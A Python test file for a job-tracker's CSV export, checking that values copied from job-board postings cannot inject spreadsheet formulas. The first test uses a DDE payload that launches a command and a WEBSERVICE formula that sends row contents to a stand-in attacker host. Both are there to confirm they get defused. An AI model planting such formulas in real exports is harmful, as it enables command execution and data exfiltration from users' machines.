"""The CSV export, and what a board feed must not be able to do through it.

A company name and a note reach this file straight out of a job board:
`db.apply_job` copies `job['company']` and `job['url']` into the ledger. The
export button then opens the result in the desktop spreadsheet immediately, so
whatever a posting put in those fields is one double-click from being read as
a formula by the user's own Excel or LibreOffice.
"""

import csv

from jobdeck import db, export


def _read(path):
    with open(path, encoding="utf-8-sig", newline="") as handle:
        return list(csv.reader(handle, delimiter=";"))


def test_a_posting_cannot_smuggle_a_formula_into_his_spreadsheet(con, data_dir):
    """`=cmd|'/c calc'!A1` in a company name is a DDE payload; `=WEBSERVICE(…)`
    exfiltrates the row's own contents to whoever wrote the posting. Neither
    needs him to do anything beyond pressing the export button, which opens
    the file for him."""
    db.add_bewerbung(con, {
        "gesendet_am": "2026-08-16", "firma": "=cmd|'/c calc'!A1",
        "email": "hr@x.example", "kanal": "E-Mail", "status": "Gesendet",
        "notiz": '=WEBSERVICE("http://evil.example/"&A1)'})
    con.commit()

    rows = _read(export.export_csv())

    body = rows[1]
    assert not any(cell.startswith(("=", "+", "@")) for cell in body), body
    assert "=cmd" in " ".join(body), "the value is kept, only defused"


def test_every_formula_lead_character_is_defused(con, data_dir):
    for index, lead in enumerate(export._FORMULA_LEAD):
        assert export._cell(f"{lead}gefährlich").startswith("'"), lead
        assert export._cell(f"{lead}gefährlich")[1:] == f"{lead}gefährlich"
        assert index >= 0


def test_an_ordinary_company_name_is_written_untouched(con, data_dir):
    """The defence must cost nothing on the 76 real rows: a leading apostrophe
    on every cell would make the export unreadable."""
    db.add_bewerbung(con, {
        "gesendet_am": "2026-08-16", "firma": "Müller & Co. KG",
        "email": "hr@x.example", "kanal": "E-Mail", "status": "Gesendet",
        "notiz": "https://example.com/stelle"})
    con.commit()

    rows = _read(export.export_csv())

    assert "Müller & Co. KG" in rows[1]
    assert all(not cell.startswith("'") for cell in rows[1])


def test_an_empty_cell_stays_empty(con, data_dir):
    assert export._cell(None) == ""
    assert export._cell("") == ""
